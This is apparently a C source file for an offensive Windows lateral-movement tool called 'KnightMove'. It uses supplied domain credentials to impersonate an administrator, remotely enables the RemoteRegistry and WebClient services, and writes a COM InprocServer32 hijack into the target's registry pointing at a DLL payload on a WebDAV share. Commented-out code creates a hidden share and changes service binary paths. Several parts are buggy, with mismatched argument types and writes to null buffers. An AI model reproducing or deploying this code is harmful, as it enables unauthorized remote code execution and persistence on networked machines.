#include <windows.h>
#include <stdio.h>
#include <wchar.h>
#include <winreg.h>
#include <lm.h>
#include <sddl.h>
#include "module.h"
#pragma comment(lib, "Netapi32.lib")

int main(int argc, wchar_t* argv[])
{
    if (argc <= 5) {
        printf("Usage:<Username>,<password>,<DomainName>,<hostname>,<GetConfig TRUE/FALSE>,<CLSID>(opt),<wdavAddress>\n eg  .\\KnightMove.exe \"Administrator\", \"checkpoint`@123\",\"DemoDomain\", \"DC01\", \"TRUE\", \"{asd-0f}\", \"\\\\192.168.0.34`@4449\\DavWWWRoot\\stovdll.dll\"" );
        return 1;
        
    }
    //creds
    HANDLE AdminToken = NULL;
    HANDLE PassTheHash = NULL;
    LPCSTR  DomainName = argv[3];
    LPCSTR  Username=(LPCSTR) argv[1];
    LPCSTR Password =(LPCSTR)argv[2];
    LPCSTR hostname = (LPCSTR)argv[4];
    LPCSTR NeedConfig = "TRUE";
    NeedConfig = (LPCSTR)argv[5];
    LPCSTR clsid = (LPCSTR)argv[6];
    LPCSTR Wdav = (LPCSTR)argv[7];

    printf("%s",NeedConfig);
    printf("\npassword=%s\n", Password);
    printf("%s\n", clsid);//not wide
    printf("%s\n", Wdav);
    if (Username == NULL) {
        OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &PassTheHash);
        AdminToken = PassTheHash;
        printf("used the creds of the users running this procces\n");
    }
    if (LogonUserA(
        Username,//           LPCSTR  lpszUsername,
        DomainName,//LPCSTR  lpszDomain,
        Password,//"checkpoint\$2",// LPCSTR  lpszPassword,
        LOGON32_LOGON_NEW_CREDENTIALS,//           DWORD   dwLogonType,
        LOGON32_PROVIDER_DEFAULT,//           DWORD   dwLogonProvider,
        &AdminToken       //   PHANDLE phToken
    ) && Username!=NULL) {
        printf("loged in with password %s and username %s \n",argv[2],argv[1]);
    }
    else
    {
        printf("error coudn't log in %d\n", GetLastError());
        return 1;

    }
    if (!ImpersonateLoggedOnUser(AdminToken))
        {
        printf("coudldn't imperonate the admin %d\n",GetLastError());
        return 1;
    }
    printf("got admin token %lp\n", AdminToken);

    SC_HANDLE scManager = NULL;
    SC_HANDLE service = NULL;
    LPQUERY_SERVICE_CONFIGW serviceConfig = NULL;
    LPQUERY_SERVICE_CONFIGW Newconfig = NULL;
    DWORD bytesNeeded = 0;
    DWORD errorCode = 0;
    int result = 0;
    LSTATUS  Rresult,creat;
    HKEY Rhandle,RCreat,Rinvalue,Rvalue;
    LPCSTR check = "TRUE";

    // Step 1: Open SC Manager
    scManager = OpenSCManagerA(hostname, NULL, SC_MANAGER_CONNECT);
    if (scManager == NULL) {
        errorCode = GetLastError();
        printf("OpenSCManagerW failed: %lu\n", errorCode);
        result = 1;
        goto cleanup;
    }
    printf("SC Manager opened successfully\n");
    //char serv[] = argv[1];
  
    if (NeedConfig == check) {
        service = OpenServiceW(scManager, L"RemoteRegistry", SERVICE_CHANGE_CONFIG | SERVICE_QUERY_CONFIG | SERVICE_START | SERVICE_QUERY_STATUS);
        printf("many permissions passed to openservice\n");
    }
    else {
        
        service = OpenServiceW(scManager, L"RemoteRegistry", SERVICE_CHANGE_CONFIG | SERVICE_START | SERVICE_QUERY_STATUS);
        printf("less permisions used to openservice \n"); }
    
    if (service == NULL) {
        errorCode = GetLastError();
        printf("OpenServiceW failed for service remote reg : %d\n", errorCode);
        result = 1;
        goto cleanup;
    }
    printf("Service remote reg opened successfully\n");
    //##############################
    //###################################
   
    if (NeedConfig==check) {
        Newconfig = Getconfig(service);
        if (Newconfig == 0) {
            printf("the new config aint working \n fallback to the old\n");
        }
    }
    else {
        printf("Quering Service config is not done at all\n ");
    }

    
    //#########################################
    /*
    if (!QueryServiceConfigW(service, NULL, 0, &bytesNeeded)) {
        errorCode = GetLastError();
        if (errorCode != ERROR_INSUFFICIENT_BUFFER) {
            printf("QueryServiceConfigW failed: %lu\n", errorCode);
            result = 1;
            goto cleanup;
        }
    }
    serviceConfig = (LPQUERY_SERVICE_CONFIGW)LocalAlloc(LPTR, bytesNeeded);
    if (serviceConfig == NULL) {
        printf(L"Memory allocation failed\n");
        result = 1;
        goto cleanup;
    }
    if (!QueryServiceConfigW(service, serviceConfig, bytesNeeded, &bytesNeeded)) {
        errorCode = GetLastError();
        printf("QueryServiceConfigW failed: %lu\n", errorCode);
        result = 1;
        goto cleanup;
    }
*/
    //

    /*
    printf("\nService Configuration:\n");
    printf("  Service Type: 0x%lx\n", serviceConfig->dwServiceType);
    printf("  Start Type: 0x%lx\n", serviceConfig->dwStartType);
    printf("  Error Control: 0x%lx\n", serviceConfig->dwErrorControl);
    printf("  Binary Path:%ls\n", serviceConfig->lpBinaryPathName);
    printf("  Display Name:%ls\n", serviceConfig->lpDisplayName);*/
    /*
    if (serviceConfig->lpDependencies != NULL && serviceConfig->lpDependencies[0] != '\0') {
        printf("  Dependencies:%ls\n", serviceConfig->lpDependencies);
    }
    if (serviceConfig->lpServiceStartName != NULL) {
        printf("  Start Name:%ls\n", serviceConfig->lpServiceStartName);
    }

    if (serviceConfig->dwStartType != NULL) {
        printf("  start type:%lx\n", serviceConfig->dwStartType);
    }
    if (serviceConfig->dwServiceType != NULL) {
        printf("  service type:%lx\n", serviceConfig->dwServiceType);
    }
    if (!EnableRemoteReg(service)) {
        goto cleanup;
    }*/
    /*
    if (!ChangeServiceConfigW(service,
        SERVICE_NO_CHANGE,    // Service type (no change)
        0x00000002,    // Start type (no change)
        SERVICE_NO_CHANGE,    // Error control (no change)
        // L"C:\\Program Files\\Windows Media Player\\wmpnetwk.exe",             // New binary path
          //L"C:\\Users\\AlaZar\\Desktop\\fordebug.exe",
        //L"C:\\Windows\\System32\\valid4.exe",
        //L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
       // L"C:\\Windows\\System32\\reg.exe add \"HKCU\\Software\\Classes\\CLSID\\{69DDBB56-9D1D-4FD9-89C5-C0DA2A625392}\" /ve /d \"Custom COM\" /f",
        //"C:\\Users\\AlaZar\\source\\repos\\valid4\\valid4\\x64\\Debug\\valid4.exe",
        NULL,
        NULL,                 // Load order group (no change)
        NULL,                 // Tag ID (no change)
        NULL,                 // Dependencies (no change)
        NULL,                 // Service account (no change)
        NULL,                 // Password (no change)
        NULL)) {              // Display name (no change)
        errorCode = GetLastError();
        printf("ChangeServiceConfigW failed: %lu\n", errorCode);
        result = 1;
        goto cleanup;
    }*/
    //printf("Service configuration updated successfully\n");
  //  printf("Service configuration updated successfully\n");

    /*

    if (!StartServiceW(service, 0, NULL)) {
        errorCode = GetLastError();

        // Check if service is already running
        if (errorCode == ERROR_SERVICE_ALREADY_RUNNING) {
            printf("Service is already running\n");
        }
        else {
            printf("StartServiceW failed: %lu\n", errorCode);
            result = 1;
            goto cleanup;
        }
    }
    else {
        printf("Service started successfully\n");

    }*/
    if (!EnableRemoteReg(service)) {
        printf("coundn't enable remote reg \n");
        goto cleanup;
    }
    if (!enableWebClient(scManager)) {
        printf("coundn't enable webclient U may need to use share files\n");
        goto cleanup;
    }
    /*
    if (TRUE) {
        FILE *src, * dis;
        char buff[8192];
        size_t byte;
        src = fopen("C:\\Users\\AlaZar\\source\\repos\\Dll25555\\Dll25555\\Dll25555.dll", "rb");
        LPSTR SharePath = NULL;//for now lets use the local share
        dis = fopen(SharePath,"wb");//error expected
        if (src && dis) {
            while ((byte = fread(buff, 1, sizeof(buff), src)) > 0) {
                fwrite(buff, 1, byte, dis);
            }
            printf("Upload completed!\n");
        }
        if (src) fclose(src);
        if (dis) fclose(dis);
    }
    else
    {
        PSECURITY_DESCRIPTOR pSD = NULL;
        if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
            L"D:(A;;GR;;;WD)", // DACL: Allow GENERIC_READ to Everyone (WD)
            SDDL_REVISION_1,
            &pSD,
            NULL)) {
            printf("Failed to create security descriptor (%lu)\n", GetLastError());
            return 1;
        }

        SHARE_INFO_502  p;
        DWORD shareRrror = 0;
        p.shi502_path = TEXT("C:\\Users\\AlaZar\\Downloads\\donut");
        p.shi502_current_uses = 0;
        p.shi502_max_uses = 4;
        p.shi502_netname = L"SHAREDdllfileLast";//append $ to hide 
        p.shi502_permissions = 0;
        p.shi502_type = STYPE_DISKTREE;
        p.shi502_remark = TEXT("TESTSHARE to test NetShareAdd");
        p.shi502_passwd = NULL;
        NET_API_STATUS res;
        p.shi502_security_descriptor = pSD;

        res = NetShareAdd(
            NULL, //[in]  LMSTR   servername,
            2,//DWORD   level,
            &p,// LPBYTE  buf,
            &shareRrror//[out] LPDWORD parm_err
        );
        if (res != 0) {
            printf("share not created error%u and %u", res, shareRrror);
            goto cleanup;
        }
    }*/
    printf("a little more to build\n");
    printf("%s\n", hostname);
    Rresult= RegConnectRegistryA(
        hostname,
        HKEY_CURRENT_USER,
        &Rhandle 
    );
    if (Rresult != ERROR_SUCCESS) {
        printf("coudn't get reg handle %ld ",Rresult);
        return 1;
    }
    printf("got a handle of remote Reg\n");
    DWORD depo;
   /* WCHAR dCLSID = argv[6];
    //check dCLSID
    LPCWSTR Dpath = NULL;
    wsprintf(Dpath,L"Software\\Classes\\CLSID\\%S",dCLSID);
    printf("CLSID is %s", Dpath);*/
    
    if (RegCreateKeyExW(
        Rhandle   ,
        L"Software\\Classes\\CLSID\\{68DDBB56-9D1D-4FD9-89C5-C0DA2A625392}",//check needed 
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_SET_VALUE,
        NULL,
        &RCreat,
        &depo
    ) == ERROR_SUCCESS) {
        printf("First move %ld\n",depo);
    }
    else
    {
        printf("failed 0 \n");
        RegCloseKey(Rhandle);
        goto cleanup;
    }
    DWORD depo2;
    if (RegCreateKeyExW(
        RCreat,
        L"InprocServer32",
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_SET_VALUE,
        NULL,
        &Rinvalue,
        &depo2
    ) == ERROR_SUCCESS) {
        printf("Inproc enrty got created %ld\n", depo);
    }
    else
    {
        printf("failed 0 \n");
        RegCloseKey(RCreat);
        goto cleanup;
    }

    //LPCWSTR path = L"C:\\Users\\AlaZar\\source\\repos\\gui\\x64\\Debug\\gui.dll";
   // LPCWSTR path =L"\\\\DESKTOP-9HGTUJ4\\SHAREDdll\\stov.dll";
    LPCWSTR path = L"\\\\192.168.1.119@4449\\DavWWWRoot\\stovdll.dll";//payloadPath
    
    if(RegSetValueExA(
        Rinvalue,
        NULL,
        0,
        REG_SZ,
        (const BYTE*)Wdav,
        (DWORD)((wcslen(Wdav) + 1) * sizeof(wchar_t))
    ) ==ERROR_SUCCESS){
        printf("path as a value assigned\n");
        }
    else
    {
        printf("failed 1 \n");
        RegCloseKey(Rinvalue);
        goto cleanup;
    }
    LPCWSTR threadingModel = L"Apartment";
    if (RegSetValueExW(
        Rinvalue,
        L"ThreadingModel",   // named value
        0,
        REG_SZ,
        (const BYTE*)threadingModel,//ERROR
        (DWORD)((wcslen(threadingModel) + 1) * sizeof(WCHAR))//ERROR
    ) == ERROR_SUCCESS) {
        printf("threading value assigned\n");
    }
    else
    {
        printf("failed 2\n");
        RegCloseKey(Rhandle);
        goto cleanup;
    }
    LPCSTR hkcuClsid = NULL;
    wsprintfA(hkcuClsid, "Software\\Classes\\CLSID\\%s", argv[6]);
  
    printf("%s\n", hkcuClsid);


cleanup:
    // Cleanup resources
    if (Newconfig != NULL) {
        LocalFree(Newconfig);
    }
    if (service != NULL) {
        CloseServiceHandle(service);
    }
    if (scManager != NULL) {
        CloseServiceHandle(scManager);
    }
   
        

    return result;
}